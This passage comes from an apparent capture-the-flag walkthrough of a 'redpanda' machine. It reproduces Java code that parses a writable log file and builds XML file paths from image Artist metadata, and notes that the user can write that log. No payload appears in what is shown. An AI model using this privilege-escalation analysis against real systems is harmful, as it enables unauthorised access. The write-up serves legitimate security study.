background-color: null;
font-style: inherit;">{</span></span>
<span id="cb10-24">        <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">if</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>tag<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">getTagName</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">()</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">==</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Artist"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">)</span></span>
<span id="cb10-25">          <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">return</span> tag<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">getDescription</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">();</span> </span>
<span id="cb10-26">      <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">}</span> </span>
<span id="cb10-27">    <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">}</span> </span>
<span id="cb10-28">    <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">return</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"N/A"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span></span>
<span id="cb10-29">  <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">}</span></span>
<span id="cb10-30">  </span>
<span id="cb10-31">  <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">public</span> <span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">static</span> <span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">void</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">addViewTo</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">String</span> path<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">String</span> uri<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">)</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">throws</span> JDOMException<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">IOException</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="cb10-32">    SAXBuilder saxBuilder <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">new</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">SAXBuilder</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">();</span></span>
<span id="cb10-33">    XMLOutputter xmlOutput <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">new</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">XMLOutputter</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">();</span></span>
<span id="cb10-34">    xmlOutput<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">setFormat</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">Format</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">getPrettyFormat</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">());</span></span>
<span id="cb10-35">    <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">File</span> fd <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">new</span> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">File</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>path<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">);</span></span>
<span id="cb10-36">    <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">Document</span> doc <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> saxBuilder<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">build</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>fd<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">);</span></span>
<span id="cb10-37">    <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">Element</span> rootElement <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> doc<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">getRootElement</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">();</span></span>
<span id="cb10-38">    <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">for</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">Element</span> el <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span> rootElement<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">getChildren</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">())</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="cb10-39">      <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">if</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>el<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">getName</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">()</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">==</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"image"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">)</span></span>
<span id="cb10-40">        <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">if</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>el<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">getChild</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"uri"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">).</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">getText</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">().</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">equals</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>uri<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">))</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="cb10-41">          <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">Integer</span> totalviews <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">Integer</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">valueOf</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">Integer</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">parseInt</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>rootElement<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">getChild</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"totalviews"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">).</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">getText</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">())</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">+</span> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">1</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">);</span></span>
<span id="cb10-42">          <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">System</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">out</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">println</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Total views:"</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">+</span> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">Integer</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">toString</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>totalviews<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">intValue</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">()));</span></span>
<span id="cb10-43">          rootElement<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">getChild</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"totalviews"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">).</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">setText</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">Integer</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">toString</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>totalviews<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">intValue</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">()));</span></span>
<span id="cb10-44">          <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">Integer</span> views <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">Integer</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">valueOf</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">Integer</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">parseInt</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>el<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">getChild</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"views"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">).</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">getText</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">()));</span></span>
<span id="cb10-45">          el<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">getChild</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"views"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">).</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">setText</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">Integer</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">toString</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>views<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">intValue</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">()</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">+</span> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">1</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">));</span></span>
<span id="cb10-46">        <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">}</span>  </span>
<span id="cb10-47">    <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">}</span> </span>
<span id="cb10-48">    <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">BufferedWriter</span> writer <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">new</span> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">BufferedWriter</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">new</span> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">FileWriter</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>fd<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">));</span></span>
<span id="cb10-49">    xmlOutput<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">output</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>doc<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> writer<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">);</span></span>
<span id="cb10-50">  <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">}</span></span>
<span id="cb10-51">  </span>
<span id="cb10-52">  <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">public</span> <span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">static</span> <span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">void</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">main</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">String</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">[]</span> args<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">)</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">throws</span> JDOMException<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">IOException</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> JpegProcessingException <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="cb10-53">    <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">File</span> log_fd <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">new</span> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">File</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"/opt/panda_search/redpanda.log"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">);</span></span>
<span id="cb10-54">    <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">Scanner</span> log_reader <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">new</span> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">Scanner</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>log_fd<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">);</span></span>
<span id="cb10-55">    <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">while</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>log_reader<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">hasNextLine</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">())</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="cb10-56">      <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">String</span> line <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> log_reader<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">nextLine</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">();</span></span>
<span id="cb10-57">      <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">if</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(!</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">isImage</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>line<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">))</span></span>
<span id="cb10-58">        <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">continue</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span> </span>
<span id="cb10-59">      <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">Map</span> parsed_data <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">parseLog</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>line<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">);</span></span>
<span id="cb10-60">      <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">System</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">out</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">println</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>parsed_data<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">get</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"uri"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">));</span></span>
<span id="cb10-61">      <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">String</span> artist <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">getArtist</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>parsed_data<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">get</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"uri"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">).</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">toString</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">());</span></span>
<span id="cb10-62">      <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">System</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">out</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">println</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Artist: "</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">+</span> artist<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">);</span></span>
<span id="cb10-63">      <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">String</span> xmlPath <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"/credits/"</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">+</span> artist <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">+</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"_creds.xml"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span></span>
<span id="cb10-64">      <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">addViewTo</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>xmlPath<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> parsed_data<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">get</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"uri"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">).</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">toString</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">());</span></span>
<span id="cb10-65">    <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">}</span> </span>
<span id="cb10-66">  <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">}</span></span>
<span id="cb10-67"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">}</span></span></code></pre></div>
<p>Starting from main, the jar-file opens <code>/opt/panda_search/redpanda.log</code> and reads the output, line by line, top down. Note that we have read+write over the file as it’s owned by group <code>logs</code>.</p>
<div class="sourceCode" id="cb11" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb11-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">woodenk@redpanda:/dev/shm$</span> ls <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-al</span> /opt/panda_search/redpanda.log </span>
<span id="cb11-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rw-rw-r--</span> 1 root logs 280 Aug 16 12:46 /opt/panda_search/redpanda.log</span>
<span id="cb11-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">woodenk@redpanda:/dev/shm$</span> id</span>
<span id="cb11-4"><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">uid</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>1000<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">woodenk</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">gid</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>1001<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">logs</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">groups</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>1001<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">logs</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">,1000</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">woodenk</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span></code></pre></div>
<p><strong>Below are the steps we need to understand:</strong></p>
<p>1, Verify that <code>.jpg</code> is present in <code>redpanda.log</code>.</p>
<div class="sourceCode" id="cb12" style="background: #f1f3f5;"><pre class="sourceCode java code-with-copy"><code class="sourceCode java"><span id="cb12-1"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">// MAIN</span></span>
<span id="cb12-2"><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">File</span> log_fd <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">new</span> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">File</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"/opt/panda_search/redpanda.log"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">);</span></span>
<span id="cb12-3"><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">Scanner</span> log_reader <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">new</span> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">Scanner</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>log_fd<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">);</span></span>
<span id="cb12-4"><span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">while</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>log_reader<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">hasNextLine</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">())</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="cb12-5">  <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">String</span> line <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> log_reader<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">nextLine</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">();</span></span>
<span id="cb12-6">  <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">if</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(!</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">isImage</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>line<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">))</span></span>
<span id="cb12-7">    <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">continue</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span> </span>
<span id="cb12-8"></span>
<span id="cb12-9"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">// isImage</span></span>
